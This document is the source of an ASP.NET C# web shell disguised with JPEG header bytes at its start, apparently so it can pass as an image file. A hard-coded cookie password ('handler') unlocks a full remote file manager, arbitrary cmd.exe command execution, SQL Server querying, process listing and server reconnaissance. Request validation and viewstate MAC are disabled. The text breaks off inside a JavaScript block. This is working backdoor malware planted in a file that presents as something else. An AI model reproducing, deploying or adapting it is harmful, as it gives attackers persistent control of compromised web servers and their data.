ÿØÿà JFIF      ÿþÉj<%@ Page Language="C#"   trace="false" EnableViewStateMac="false"  validateRequest="false"  enableEventValidation="false" %>
<%@ import Namespace="System.Collections.Generic"%> 
<%@ import Namespace="System.Web.Services"%> 
<%@ import Namespace="System.Web"%> 
<%@ import Namespace="System.IO"%> 
<%@ import Namespace="System"%> 
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Diagnostics"%> 
<%@ Import Namespace="System.Data.SqlClient"%>
<%@ import Namespace="Microsoft.Win32"%>
<%@ import Namespace="System.Management"%>
<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<!DOCTYPE html>
<style type="text/css">
body {
	background: #f0f0f0;
	margin: 0;
	padding: 0; 
	font: 12px normal Verdana, Arial, Helvetica, sans-serif;
	color: #444;
    width:1000px;
}
h1 {font-size: 3em; margin: 20px 0;}
.container {width: 90%; margin: 10px auto;}
ul.tabs {
	margin: 0;
	padding: 0;
	float: left;
	list-style: none;
	height: 32px;
	border-bottom: 1px solid #999;
	border-left: 1px solid #999;
	width: 100%;
}
ul.tabs li {
	float: left;
	margin: 0;
	padding: 0;
	height: 31px;
	line-height: 31px;
	border: 1px solid #999;
	border-left: none;
	margin-bottom: -1px;
	background: #e0e0e0;
	overflow: hidden;
	position: relative;
}
ul.tabs li a {
	text-decoration: none;
	color: #000;
	display: block;
	font-size: 1.2em;
	padding: 0 20px;
	border: 1px solid #fff;
	outline: none;
}
ul.tabs li a:hover {
	background: #ccc;
}	
html ul.tabs li.active, html ul.tabs li.active a:hover  {
	background: #fff;
	border-bottom: 1px solid #fff;
}
.tab_container {
	border: 1px solid #999;
	border-top: none;
	clear: both;
	float: left; 
	width: 100%;
	background: #fff;
	-moz-border-radius-bottomright: 5px;
	-khtml-border-radius-bottomright: 5px;
	-webkit-border-bottom-right-radius: 5px;
	-moz-border-radius-bottomleft: 5px;
	-khtml-border-radius-bottomleft: 5px;
	-webkit-border-bottom-left-radius: 5px;
}
.tab_content {
	padding: 20px;
	font-size: 1.2em;
}
.tab_content h2 {
	font-weight: normal;
	padding-bottom: 10px;
	border-bottom: 1px dashed #ddd;
	font-size: 1.8em;
}
.tab_content h3 a{
	color: #254588;
}
.tab_content img {
	float: left;
	margin: 0 20px 20px 0;
	border: 1px solid #ddd;
	padding: 5px;
}
</style>
<style type="text/css">
    iframe.hidden
{
display:none
}
        td
        {
            padding: 2px;
            background: #e8edff;
            border-top: 1px solid #fff;
            color: #669;
            
        }
         tr:hover td{ 
                background-color:#7DFDFE;
                
                
               
                }
     th
    {
        padding: 2px;
        color: #039;
        background: #b9c9fe;
    }
                
                    
    table
    {
        height: 100%;
        width: 100%;
    }
    #content
    {
        z-index: 1;
        left: 20px;
        top: 39px;
        position: absolute;
        height: 155px;
        width: 1214px;
    }
    #upload
    {
        width: 527px;
        height: 52px;
        background-color: #CCCCCC;
    }
    #TextArea1
    {
        height: 278px;
        width: 380px;
    }
    .buttons
    {
        height:30px;
        cursor:pointer;
    }
    </style>

 

<script runat="server">
/// <problems>
/// - javascript registered code
/// - driver dropdownlist problem 
/// </problem>
/// 

    /// <TO DO>
    /// - create new file ,dir.
    /// - copy /cut file ,dir
    /// </TO DO>
    /// 

     public static string curr = "xxx";
     string connstr;
     string password="handler";
     public class data
     {
         public data(string n, string s, string fp, string lm)
         {
             Name = n; Size = s; FullPath = fp;lastmodfiy=lm;
         }
         public string Name;
         public string FullPath;
         public string Size;
         public string lastmodfiy;
     }
     public static void RegisterJavaScript(System.Web.UI.Page page)
     {
         
               page.ClientScript.RegisterHiddenField("__EVENTTARGET","");
                page.ClientScript.RegisterHiddenField("__ARGS","");
                string s=@"<script language=Javascript>";
                s+=@"function Bin_PostBack(eventTarget,eventArgument)";
                s+=@"{";
                s+=@"var theform=document.forms[0];";
                s+=@"theform.__EVENTTARGET.value=eventTarget;";
                s+=@"theform.__ARGS.value=eventArgument;";
                s+=@"theform.submit();";
                s+=@"} ";
                s+=@"</scr"+"ipt>";
                page.RegisterStartupScript("asd",s);
         
                }
     
     
                
    protected void Page_Load(object sender, EventArgs e)
    {
        Page.Title = " ";
        RegisterJavaScript(this);
        hide_allpanel();
        if (DriversList.Items.Count == 0)
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            DriversList.Items.Clear();
            DriversList.Items.Add("Select Drive");
            foreach (DriveInfo dinfo in drives)
            {

                DriversList.Items.Add(new ListItem(dinfo.Name + "  " + dinfo.DriveType, dinfo.Name));  //);
            }
        }
        //////////////////////////
       
        ////////////////////////////////
        if (check_auth())
        {
          
            this.Menue.Visible = true;
            Logout.Visible = true;
          
            
        }
        else
        {
           return;
           
        }
        msgs.Text = "";        
        
       if (Request.QueryString["Name"] != null || Request.QueryString["Name"] != "")
       {
           string temp = Request.QueryString["Name"];
           if(temp != null)
           download(base64Decode(temp));
      
       }
       
         
        if (!IsPostBack)
        {
            
            
         
             GetFiles_Dirs(".", true);
        //   string[] drivers = Directory.GetLogicalDrives();
            
           
    
        /////////////////
           
            
       }
        if (IsPostBack)
        {
           
            string evarg = Request["__EVENTTARGET"];
            string args = Request["__ARGS"];
            
          //  Page.Title = evarg;
            if (evarg != "")
            {
                switch (evarg)
                {
                    
                    case "down":
                        download(base64Decode(args));
                        break;
                    case "GetFiles_Dirs":
                        GetFiles_Dirs(base64Decode(args), false);
                        break;
                    case "shell_root":
                        GetFiles_Dirs(base64Decode(args), true);
                        break;
                    case "del":
                        delete_file(base64Decode(args));
                       break;
                    case "del2":
                       delete_folder(base64Decode(args));
                       break;
                    case "delall":
                       deleteall(args);
                       break;
                    case "ren":
                       rename_file(args);
                        break;
                    case "ren2":
                        rename_folder(args);
                        break;
                    case "edit":
                        editing(base64Decode(args));
                        break;

                    case "newdir":
                        create_new_dir((args));
                        break;
                    case "newfile":
                        create_new_file((args));
                        break;
                   
                }

               
            }
        }
        
        //if(IsPostBack)
      
            
    }
    public bool check_auth()
    {
        if (Request.Cookies["Login_Cookie"] == null)
        {
            return false;
        }
        else
        {
            if (Request.Cookies["Login_Cookie"].Value != password)
            {
                return false;
            }
            else
            {
                
                return true;
            }
        }
    }
    public void hide_allpanel()
    {
        this.Login.Visible = true;
        object[] divs = { this.FileManger, this.CMD, this.DBS ,this.editpanel,this.UserInfo,this.Processes_Services,this.CopyFiles};
        foreach (object s in divs)
        {
            Panel p2 = new Panel();
            p2 = (Panel)s;
            p2.Visible = false;
        }
    }

    void process()
    {
        Table tbl = new Table();

        //   tbl.Style = @"width:100%";
        tbl.Width = 870;
        this.Processes_Services.Controls.Add(tbl);
        int tblRows = 10;
        int tblCols = 3;
        TableHeaderRow header_tr = new TableHeaderRow();
        TableHeaderCell proc_id = new TableHeaderCell();
        TableHeaderCell proc_user = new TableHeaderCell();
        TableHeaderCell proc_name = new TableHeaderCell();
        proc_id.Text = "ID";
       proc_name.Text = "Process Name";
       proc_user.Text = "User";
        header_tr.Cells.Add(proc_id);
        header_tr.Cells.Add(proc_name);
         header_tr.Cells.Add(proc_user);
        tbl.Rows.Add(header_tr);
        Process[] p = Process.GetProcesses();
        foreach (Process sp in p)
        {
            TableRow data_tr = new TableRow();
            TableCell proc_id_tc = new TableCell();
             proc_id_tc.Text = sp.Id.ToString();
            TableCell proc_name_tc = new TableCell();
            proc_name_tc.Text =  sp.ProcessName;
            TableCell proc_user_tc = new TableCell();
         //   proc_user_tc.Text =  GetProcessOwner(sp.Id.ToString());// GetUserName(sp.Id);//
            data_tr.Cells.Add(proc_id_tc);
            data_tr.Cells.Add(proc_name_tc);
            data_tr.Cells.Add(proc_user_tc);
            tbl.Rows.Add(data_tr);

        }
        message(true, "list process");
    }

    string get_user_process(int i)
    {
        using (ManagementObject proc = new   
            
            ManagementObject("Win32_Process.Handle='" + i.ToString() + "'"))
        {

         //   proc.Get();
            string[] s = new String[2];
            //Invoke the method and populate the array with the user name and domain

            proc.InvokeMethod("GetOwner", (object[])s);

            return s[1] + "\\" + s[0];
        }


    }
    private string GetUserName(int procName)
    {
        string[] ownerInfo = new string[2];
        foreach (ManagementObject p in PhQTd("Select * from Win32_Process Where ProcessID ='" + procName + "'"))
        {
            p.InvokeMethod("GetOwner", (object[])ownerInfo);
        }
        return ownerInfo[0];
        
        
    }

    public string GetProcessOwner(string processName)
    {
        string query = "Select * from Win32_Process Where ProcessID = \"" + processName + "\"";
        ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
        ManagementObjectCollection processList = searcher.Get();

        foreach (ManagementObject obj in processList)
        {
            string[] argList = new string[] { string.Empty, string.Empty };
            int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
            if (returnVal == 0)
            {
                // return DOMAIN\user
                string owner = argList[1] + "\\" + argList[0];
                return owner;
            }
        }

        return "NO OWNER";
    }
    
    
        public ManagementObjectCollection PhQTd(string query)
{
ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));
return QS.Get();
}
    void u_info()
    {
        Table tbl = new Table();
        
     //   tbl.Style = @"width:100%";
        tbl.Width = 870;
        this.UserInfo.Controls.Add(tbl);
        Add_Table_Row(tbl, "Server IP", Request.ServerVariables["LOCAL_ADDR"]);
        Add_Table_Row(tbl, "Host Name", Dns.GetHostName() );//Environment.MachineName);
        Add_Table_Row(tbl, "IIS Version", Request.ServerVariables["SERVER_SOFTWARE"]);
        Add_Table_Row(tbl, "IIS APPPOOL Identity", Environment.UserName);
        Add_Table_Row(tbl, "OS Version", Environment.OSVersion.ToString());
        Add_Table_Row(tbl, "System Time", DateTime.Now.ToString());
      
        
        
        message(true, "");
    }

    void Add_Table_Row(Table tbl, string s1, string s2)
    {
        TableRow data_tr = new TableRow();
        TableCell cell1 = new TableCell();
        cell1.Text = s1;
        TableCell cell2 = new TableCell();
        cell2.Text = s2;
        data_tr.Cells.Add(cell1);
        data_tr.Cells.Add(cell2);
        tbl.Rows.Add(data_tr);
    }
    // ////////////////////////////////////////////
    public void process_design(object sender, EventArgs e)
    {
        Button b = sender as Button;
      //  b.BackColor = System.Drawing.Color.Red;
        //LinkButton b = sender as LinkButton;
        show_panel(b.Text);
        if (b.Text == "Processes_Services")
            process();
        if (b.Text == "UserInfo")
            u_info();
        
    }
    // /////////////////////////////////////
    public void fm(object sender, EventArgs e)
    {
        this.FileManger.Visible = true;
        GetFiles_Dirs(".", true);
    }

    public void show_panel(string ctrl)
    {
        this.Login.Visible = false;
        object[] divs = { this.FileManger, this.CMD, this.DBS,this.editpanel ,this.UserInfo, this.Processes_Services,this.CopyFiles};
        foreach (object s in divs)
        {
            Panel p2 = new Panel();
            p2 = (Panel)s;
            if (p2.ID==ctrl)
                p2.Visible = true; 
          //  if(p2.ID=="FileManger")
             //   GetFiles_Dirs(".", true);
        }
    }
    
  
   


    public string base64Encode(string data)
    {
        try
        {
            byte[] encData_byte = new byte[data.Length];
            encData_byte = System.Text.Encoding.UTF8.GetBytes(data);
            string encodedData = Convert.ToBase64String(encData_byte);
            return encodedData;
        }
        catch (Exception e)
        {
            throw new Exception("Error in base64Encode" + e.Message);
        }
    }

    public string base64Decode(string data)
    {
        try
        {
            System.Text.UTF8Encoding encoder = new System.Text.UTF8Encoding();
            System.Text.Decoder utf8Decode = encoder.GetDecoder();

            byte[] todecode_byte = Convert.FromBase64String(data);
            int charCount = utf8Decode.GetCharCount(todecode_byte, 0, todecode_byte.Length);
            char[] decoded_char = new char[charCount];
            utf8Decode.GetChars(todecode_byte, 0, todecode_byte.Length, decoded_char, 0);
            string result = new String(decoded_char);
            return result;
        }
        catch (Exception e)
        {
            throw new Exception("Error in base64Decode" + e.Message);
        }
    }
    
    public void message(bool status, string msg)
    {
        if (status == true)
        {
            msgs.ForeColor = System.Drawing.Color.Green;
            msgs.Text = "Sucess, " + msg;
        }
        else
        {
            msgs.ForeColor = System.Drawing.Color.Red;
            msgs.Text = "Error, " + msg;
        }
    }

    string count_files_dirs(string p)
    {
        int fc = 0; int dc = 0;
        string[] files = Directory.GetFiles(p);
        string[] dirs = Directory.GetDirectories(p);
        foreach (string f in files)
        {
            fc += 1;
        }
        foreach (string f in dirs)
        {
            dc += 1;
        }
        return dc+" dirs, "+fc+" files";
    }
    public  void GetFiles_Dirs(string path ,bool isvirtual)
    {
        try
        {

            show_panel(this.FileManger.ID);
            editpanel.Visible = false;
            curr = path;

            ArrayList arraydata = new ArrayList();

            string currentpath = "";
            if (isvirtual)
            {
                currentpath = HttpContext.Current.Server.MapPath(path);
            }
            else
                currentpath = path;
            currentpathlabel.Text = currentpath;
            Hidden1.Value = currentpath;


            string[] files = Directory.GetFiles(currentpath);
            string[] dirs = Directory.GetDirectories(currentpath);
            string previospath = "";
            string[] ppath = currentpath.Split('\\');
            for (int n = 1; n <= ppath.Length - 1; n++)
            {

                if (ppath.Length - 1 == 1)
                {
                    previospath += ppath[n - 1] + "\\";


                }
                else if (n == ppath.Length - 1)
                {
                    previospath += ppath[n - 1];


                }
                else
                {
                    previospath += ppath[n - 1] + "\\";

                }


            }
            string prevtemp = "";
            //  Literal1.Text = previospath;
            for (int n = 0; n < ppath.Length; n++)
            {

                if (n == 0)
                {

                    //<%=  base64Encode(ppath[n] + "\\")%>
                    string dec = base64Encode(ppath[n] + "\\");
                    Literal1.Text = "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + dec + "')\">" + ppath[n] + "\\" + "</a>";
                    prevtemp = ppath[n];

                }
                else
                {
                    string dec1 = base64Encode(prevtemp + "\\" + ppath[n]);

                    Literal1.Text += "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + dec1 + "')\">" + ppath[n] + "\\" + "</a>";
                    prevtemp = prevtemp + "\\" + ppath[n];

                }



            }
           arraydata.Add(new data("..  " , "Parent Folder", previospath, currentpath));
          
             
            //  object o = new object { Name = "..", Size = "..", FullPath = previospath.Replace(@"\", @"\\"), DataSource = currentpath };
            //fileslist.Add(new { Name = "..", Size = "..", FullPath = previospath.Replace(@"\", @"\\"), DataSource = currentpath });
             int dirs_count = 0;
            int files_count = 0;

            foreach (string d in dirs)
            {
                DirectoryInfo dinfo = new DirectoryInfo(d);
                HyperLink g = new HyperLink();
                g.Text = dinfo.Name;
                //  fileslist.Add(new { Name = dinfo.Name, Size = "Folder", FullPath = dinfo.FullName.Replace(@"\", @"\\"), DataSource = currentpath });
                arraydata.Add(new data(dinfo.Name, "Folder", dinfo.FullName, dinfo.LastWriteTime.ToString("d/MM/yyyy - hh:mm:ss tt")));
                dirs_count+=1;

            }
            foreach (string f in files)
            {
                FileInfo finfo = new FileInfo(f);


                arraydata.Add(new data(finfo.Name, finfo.Length.ToString(), finfo.FullName.Replace(@"\", @"\\"), finfo.LastWriteTime.ToString("d/MM/yyyy  - hh:mm:ss tt")));
                files_count += 1;
            }
            
           
            
            foreach (object o in arraydata)
            {
                data d = (data)o;

                HtmlTableRow r = new HtmlTableRow();
                HtmlTableCell cname = new HtmlTableCell();
                HtmlTableCell csize = new HtmlTableCell();
                HtmlTableCell lastmodify = new HtmlTableCell();
                HtmlTableCell ctodo = new HtmlTableCell();
                if (d.Size == "Parent Folder")

                    cname.InnerHtml = "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + base64Encode(d.FullPath) + "')\">" + d.Name + "</a>" + "&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp " + files_count + "&nbspFiles ," + dirs_count + "&nbspFolders";

                else if (d.Size == "Folder")
                {
                    cname.InnerHtml = "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + base64Encode(d.FullPath) + "')\">" + d.Name + "</a>";
                    csize.InnerHtml = "--";
                    lastmodify.InnerHtml = d.lastmodfiy;
                    ctodo.InnerHtml ="<a href=\"#\" onclick=\"javascript:rename2('" + d.Name + "')\">Rename</a>" + " || " +
                   "<a href=\"#\" onclick=\"javascript:if(confirm('Are you sure delete folder " + d.Name+ " it may be non-empty ,all files & dirs will be deleted ?')){Bin_PostBack('del2','" + base64Encode(d.FullPath) + "')}\">Del</a>";
                }
                else
                {
                    //"<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(objfile.DirectoryName)+"')\">"+objfile.FullName+"</a>";
                    cname.InnerHtml = "<input id=\"Checkbox1\" name=\"" + base64Encode(d.FullPath) + "\" type=\"checkbox\" />" + d.Name;
                    csize.InnerHtml = convert_bytes(Convert.ToInt64(d.Size));
                    lastmodify.InnerHtml = d.lastmodfiy;
                    ctodo.InnerHtml = "<a href= \"#\" onclick=\"javascript:Bin_PostBack('down','" + base64Encode(d.FullPath) + "')\">Down</a>" + " || " +
                        "<a href=\"#\" onclick=\"javascript:Bin_PostBack('edit','" + base64Encode(d.FullPath) + "')\">Edit</a>" + " || " +
                        "<a href=\"#\" onclick=\"javascript:rename('" + d.Name + "')\">Rename</a>" + "|" +
                        "<a href=\"#\" onclick=\"javascript:Bin_PostBack('copymove','" + base64Encode(d.FullPath) + "')\">Copy/Move</a>" + " || " +
                    "<a href=\"#\" onclick=\"javascript:if(confirm('Are you sure delete the file  "+ d.Name+"  ?')){Bin_PostBack('del','" + base64Encode(d.FullPath) + "')}\">Del</a>";
                }
                r.Cells.Add(cname);
                r.Cells.Add(csize);
                r.Cells.Add(lastmodify);
                r.Cells.Add(ctodo);
                tblEmployee.Rows.Add(r);


            }
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
    }

    string convert_bytes(Int64 bytes)
    {
        
        if ((bytes / 1024) < 1)
            return bytes + " B";
         
        else if ((bytes / (1024 * 1024)) < 1)
           return string.Format("{0:####0.0} KB",(double) bytes / 1024 );
            
        else if ((bytes / (1024 * 1024 * 1024)) < 1)
           return string.Format("{0:####0.0} MB", (double)bytes / (1024 * 1024));
                       
        else
            return string.Format("{0:####0.0} GB", (double) bytes / (1024 * 1024 * 1024));

    
    
    }
    // //////////////////////////////

    void create_new_dir(string dir)
    {
        try
        {
            string path = currentpathlabel.Text + "\\";
            Directory.CreateDirectory(path + dir);
            message(true, "Folder:" + " '" + dir + "' " + "Created");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        } 
        
        GetFiles_Dirs(currentpathlabel.Text, false);
    }

    void create_new_file(string file)
    {
        try
        {
            string path = currentpathlabel.Text + "\\";
            if (File.Exists(path + file))
            {
                message(false, "File" + " '" + file + "' " + "exist,you can edit it");
                GetFiles_Dirs(currentpathlabel.Text, false);
            }
            else
            {

                StreamWriter sr = new StreamWriter(path + file, false);
                sr.Close();
                message(true, "New File" + " '" + file + "' " + "Created");
                editing(path + file);
            }
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }

       // GetFiles_Dirs(currentpathlabel.Text, false);
    }
    // //////// Edit File//////////////////
    public void editing(string file)
    {
        try
        {
            show_panel("editpanel");


            filetoedit.Text = file;
            if (File.Exists(file))
            {
                StreamReader sr;

                sr = new StreamReader(file);

                editfile.Text = sr.ReadToEnd();
                sr.Close();
            }
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }

    }
    protected void Save_Click(object sender, EventArgs e)
    {
        try
        {

            StreamWriter sw;
            string file = filetoedit.Text;
            sw = new StreamWriter(file, false);

            sw.Write(editfile.Text);
            sw.Close();
            message(true, "File:" + " '" + file + "' " + "Saved");


        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
        GetFiles_Dirs(currentpathlabel.Text, false);
    }
    // /////////////////////////////////
    
    // ///////////upload///////////////////
    protected void Upload_Click(object sender, EventArgs e)
    {
        try
            {

        if (FileUpload1.HasFile)
             {
            
                string filename = Path.GetFileName(FileUpload1.FileName);
                FileUpload1.SaveAs(currentpathlabel.Text + "\\" + filename);
                message(true, "File: '" + currentpathlabel.Text + "\\" + filename + "'Uploaded");
              
             }
        }
            catch (Exception ex)
            {
                message(false, ex.Message);
            }
          GetFiles_Dirs(currentpathlabel.Text, false);
    }
    // ////////////////////////////////////////////
    
    // /////////////download file(s)/////////////////
    public void download(string path)
    {
        try
        {
            FileInfo fs = new FileInfo(path);
            Response.Clear();
            Page.Response.ClearHeaders();
            Page.Response.Buffer = false;
            this.EnableViewState = false;
           // Response.AddHeader("Content-Disposition", "attachment;filename=" + HttpUtility.UrlEncode(fs.Name, System.Text.Encoding.UTF8));
            Response.AddHeader("Content-Disposition", "attachment;filename=" + fs.Name);
            Response.AddHeader("Content-Length", fs.Length.ToString());
            Page.Response.ContentType = "application/unknown";
            Response.WriteFile(fs.FullName);
            Page.Response.Flush();
            Page.Response.Close();
            Response.End();
            Page.Response.Clear();           
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
            
    }

    // ////////////////////////////////////////////

    // /////////////rename file(s)/////////////////
    public void rename_file(string paths)
    {
        try
        {
            string[] files = paths.Split(',');

            File.Move(currentpathlabel.Text + "\\" + files[0], currentpathlabel.Text + "\\" + files[1]);
            message(true, "File Renamed");
         
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }  
        GetFiles_Dirs(currentpathlabel.Text, false);
    }
     /////////////////////////////////////////////

    public void rename_folder(string paths)
    {
        try
        {
            string[] files = paths.Split(',');
            
           Directory.Move(currentpathlabel.Text + "\\" + files[0], currentpathlabel.Text + "\\" + files[1]);
            message(true, "Folder Renamed");

        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
        GetFiles_Dirs(currentpathlabel.Text, false);
    }
    // ////////////////////////////
     
    // /////////////delete files/////////////////
    public void deleteall(string paths)
    {
        try
        {
            string[] files = paths.Split(',');
            for (int i = 0; i < files.Length - 1; i++)
            {

                File.Delete(base64Decode(files[i]));
            }
            message(true, "Files Delted");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
      


        
        GetFiles_Dirs(currentpathlabel.Text, false);
    }

    // ////////////////////////////////////////////

    // /////////////delete file/////////////////
    public void delete_file(string path)
    {
        try
        {
            FileInfo fs = new FileInfo(path);


            fs.Delete();
            message(true, "File Deleted");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
        GetFiles_Dirs(currentpathlabel.Text, false);
    }
        //////////////////////////////////////
        
        public void delete_folder(string path)
    {
        try
        {
            DirectoryInfo  fs = new DirectoryInfo(path);


            fs.Delete(true);
            message(true, "Folder Deleted");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
        
        GetFiles_Dirs(currentpathlabel.Text, false);
    }



    // ////////////////////////////////////////////

    // /////////////dos commands/////////////////
    protected void CmdSubmit_Click(object sender, EventArgs e)
    {
        show_panel(this.CMD.ID);
        CmdResult.Text = command(Command.Text);
    }
   
    public static string command(string cmd)
    {
      //  string argument = string.Format(@" -S {0} -U {1} -P {2} ", "LOSMAN-PC", "test", "asd");
        string argument = string.Format(@" -S {0} ", "LOSMAN-PC");
      //  System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("sqlcmd.exe",argument);
      System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("cmd.exe");
        psi.CreateNoWindow = true;
        psi.UseShellExecute = false;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardInput = true;
        psi.RedirectStandardError = true;
        psi.WorkingDirectory = HttpContext.Current.Server.MapPath(".");
        // Start the process
        System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi);

        // Attach the output for reading
        System.IO.StreamReader sOut = proc.StandardOutput;
        System.IO.StreamReader sOut2 = proc.StandardError;
        //  sOut = proc.StandardError;
        // Attach the in for writing
        System.IO.StreamWriter sIn = proc.StandardInput;
        string commands = cmd;
        string[] delimiter = { Environment.NewLine };

        string[] b = commands.Split(delimiter, StringSplitOptions.None);
        foreach (string s in b)
        {
            sIn.WriteLine(s);
        }
        // string stEchoFmt = "# {0} run successfully. Exiting";


        //  sIn.WriteLine(String.Format(stEchoFmt, ""));
        // Write each line of the batch file to standard input
        sIn.WriteLine("Exit");
        // Close the process
        proc.Close();
        // Read the sOut to a string.
        string results = sOut.ReadToEnd().Trim();
      string resultserror =sOut2.ReadToEnd().Trim();
        // Close the io Streams;
        sIn.Close();
        sOut.Close();

        return results + resultserror;

    }

    // ////////////////////////////////////////////

    // /////////////get drive files & dirs/////////////////
    protected void slctdrive_Click(object sender, EventArgs e)
    {
        try
        {

           if (DriversList.SelectedValue == "Select Drive")
               GetFiles_Dirs(currentpathlabel.Text, false);
           
               GetFiles_Dirs(DriversList.SelectedValue, false);
        //}
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }

    }
    private void getdatabases(int ind)
    {

        try
        {
            DropDownList1.Items.Clear();

            SqlConnection myconn;
            SqlCommand mycomm;

            myconn = new SqlConnection(connections.Text);
            myconn.Open();
            string command = "SELECT name FROM sys.sysdatabases where name NOT IN ('master', 'tempdb', 'model', 'msdb') order by name; ";

            mycomm = new SqlCommand(command, myconn);
            SqlDataReader dr = mycomm.ExecuteReader();
            while (dr.Read())
            {
                DropDownList1.Items.Add(dr[0].ToString());
            }
            myconn.Close();

            DropDownList1.SelectedIndex = ind;

        }
        catch (Exception ex)
        {
            msgs.Text = ex.Message;
        }
    }
    // ///////////////////////////
    private void gettables(int ind)
    {
        try
        {
            DropDownList2.Items.Clear();

            SqlConnection myconn;
            SqlCommand mycomm;

            myconn = new SqlConnection(connections.Text);
            myconn.Open();
            string command = "SELECT * FROM sys.tables order by name; ";

            mycomm = new SqlCommand(command, myconn);
            SqlDataReader dr = mycomm.ExecuteReader();
            while (dr.Read())
            {

                DropDownList2.Items.Add(dr[0].ToString());
            }

            DropDownList2.SelectedIndex = ind;
            myconn.Close();
        }
        catch (Exception ex)
        {
            msgs.Text = ex.Message;
        }
    }


    // //////////////////////////////////////////////////////////////////
    public ArrayList getcolums()
    {
          SqlConnection myconn;
            SqlCommand mycomm;
            ArrayList arrcolumns = new ArrayList();
            myconn = new SqlConnection(connections.Text);
            myconn.Open();
            string command = "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Bugs'; ";

            mycomm = new SqlCommand(command, myconn);
            SqlDataReader dr = mycomm.ExecuteReader();
            Table tbl = new Table();
           this.DBS.Controls.Add(tbl);
           while (dr.Read())
           {
               arrcolumns.Add(dr[0].ToString());
           }
           return arrcolumns;
    }
     private void CreateDynamicTable(string query)
    {
        try
        {
            // ArrayList arrcolumns = getcolums();
            SqlConnection myconn;
            SqlCommand mycomm;

            myconn = new SqlConnection(connections.Text);
            myconn.Open();
            string command = query;

            mycomm = new SqlCommand(command, myconn);
            SqlDataReader dr = mycomm.ExecuteReader();
            Table tbl = new Table();
            tbl.Width = 100;
            this.DBS.Controls.Add(tbl);
            int tblRows = 10;
            int tblCols = dr.FieldCount; ;
            TableRow tr2 = new TableRow();

            for (int j = 0; j < dr.FieldCount; j++)
            {
                TableHeaderCell tc = new TableHeaderCell();
                TextBox txtBox = new TextBox();


                // Add the control to the TableCell
                tc.Text = dr.GetName(j).ToString();
                // Add the TableCell to the TableRow
                tr2.Cells.Add(tc);
            }
            tbl.Rows.Add(tr2);
            int c = 0;
            while (dr.Read())
            {
                

                TableRow tr = new TableRow();
                for (int j = 0; j < tblCols; j++)
                {
                    TableCell tc = new TableCell();
                    TextBox txtBox = new TextBox();

                    // Add the control to the TableCell
                    tc.Text = dr[j].ToString();
                    // Add the TableCell to the TableRow
                    tr.Cells.Add(tc);
                }
                // Add the TableRow to the Table
                tbl.Rows.Add(tr);
                c=c+1;
               
            }
            message(true, c.ToString() + " rows selected");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
 
       // This parameter helps determine in the LoadViewState event,
       // whether to recreate the dynamic controls or not
 
      
    }
    // ////////////////////////////
    protected void gdb_Click(object sender, EventArgs e)
    {
        show_panel(this.DBS.ID);
        connstr = connections.Text;
        getdatabases(0);
    }

 
    protected void Button1_Click(object sender, EventArgs e)
    {
        show_panel(this.DBS.ID);
        gettables(0);
       // CreateDynamicTable();
    }
    // //////////////////////////////////////////////////////////////////

    protected void executequery_Click(object sender, EventArgs e)
    {
        show_panel(this.DBS.ID);
        CreateDynamicTable(sqlquery.Text);
    }

    protected void Login_Button_Click(object sender, EventArgs e)
    {
        string pass = Login_TextBox.Text;
        if (pass == password)
        {
            Response.Cookies.Add(new HttpCookie("Login_Cookie", pass));
          //  show_panel(this.FileManger.ID);
             GetFiles_Dirs(".", true);
             this.Menue.Visible = true;
             Logout.Visible = true;
         }
        else
        {
         
        }
    }

    protected void Logout_Click(object sender, EventArgs e)
    {
        hide_allpanel();
        this.Menue.Visible = false;
        //this.Login.Visible = true;
        Session.Abandon();
        Response.Cookies.Add(new HttpCookie("Login_Cookie", null));
        Logout.Visible = false;
    }

    protected void Button_process_Click(object sender, EventArgs e)
    {
        show_panel(this.Processes_Services.ID);
        process();
    }

    protected void Button_services_Click(object sender, EventArgs e)
    {
        show_panel(this.Processes_Services.ID);
        process();
    }

    protected void DriversList_SelectedIndexChanged(object sender, EventArgs e)
    {
     //  DriversList.SelectedIndex =DriversList.Items[DriversList.SelectedIndex].;
        Page.Title = DriversList.SelectedValue;
    }
    public void CopyShell(String Source, String Dest)
    {
        System.IO.File.Copy(Source, Dest, true);
    }
    public void CopyFile(object sender, EventArgs e)
    {
        show_panel(this.CopyFiles.ID);
        try
        {
            CopyShell(this.TextBox1.Text, this.TextBox2.Text);
            Label3.Text = "Success............";
        }
        catch (Exception ex)
        {
            Label3.Text = ex.Message;
        }
    }
</script>

<script type="text/javascript">

    function rename(file) {
        var f = prompt("rename file:", file);
        var renfile = file;
        if (f != null) {
            renfile += "," + f
            Bin_PostBack('ren', renfile);

        }

    }


    function rename2(folder) {
        var f = prompt("rename file:", folder);
        var renfile = folder;
        if (f != null) {
            renfile += "," + f
            Bin_PostBack('ren2', renfile);

        }

    }

    function newfolder() {
        var folder = prompt("Create New Folder", "");
       
